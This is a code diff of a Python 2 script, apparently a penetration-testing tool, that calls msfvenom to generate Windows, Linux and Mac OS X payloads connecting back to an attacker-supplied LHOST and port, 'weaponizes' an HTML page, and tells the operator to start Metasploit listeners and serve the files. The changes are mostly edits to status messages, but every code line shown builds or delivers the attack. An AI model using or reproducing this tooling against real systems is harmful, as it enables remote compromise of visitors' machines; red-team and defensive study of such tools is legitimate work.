@@ -46,7 +46,7 @@ def perform_checks():
   except OSError:
     pass
   if not os.path.isdir('output'):
-    print 'Unable to create output directory. Please ensure that the current directory.'
+    print 'Unable to create output directory. Please ensure that the current directory is writable.'
     return False
   return True
 
@@ -79,11 +79,11 @@ if __name__ == '__main__':
     elif opt == '-m':
       osx = arg
 
-  print 'Generating Windows payload...'
+  print 'Generating Windows payload: {payload}...'.format(payload=windows)
   os.system('msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
-  print 'Generating Linux payload...'
+  print 'Generating Linux payload: {payload}...'.format(payload=linux)
   os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
-  print 'Generating Mac OS X payload...'
+  print 'Generating Mac OS X payload: {payload}...'.format(payload=osx)
   os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
 
   print 'Weaponizing html...'
@@ -132,6 +132,7 @@ echo "You may now surf to http://{ip_address}/"
 
   print 'All output written to the "output" directory.'
   print
-  print 'Start your Metasploit listeners using the command: msfconsole -r output/listeners.rc'
-  print 'Then copy the remaining files in your output directory to your web root (usually /var/www/).'
-  print 'Alternatively, start a lightweight webserver using the command: cd output && python -m SimpleHTTPServer'
+  print 'Run "serve.sh" to easily stand up a server.'
+  # print 'Start your Metasploit listeners using the command: msfconsole -r output/listeners.rc'
+  # print 'Then copy the remaining files in your output directory to your web root (usually /var/www/).'
+  # print 'Alternatively, start a lightweight webserver using the command: cd output && python -m SimpleHTTPServer'
